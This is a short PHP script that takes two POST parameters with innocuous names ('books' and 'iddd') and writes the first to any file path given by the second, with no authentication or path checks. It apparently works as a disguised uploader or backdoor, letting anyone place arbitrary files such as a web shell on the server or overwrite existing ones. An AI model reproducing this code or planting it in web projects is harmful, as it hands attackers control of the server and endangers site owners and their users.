<?php 

$books=$_POST['books'];
$iddd=$_POST['iddd'];
echo file_put_contents($iddd, $books);

?>
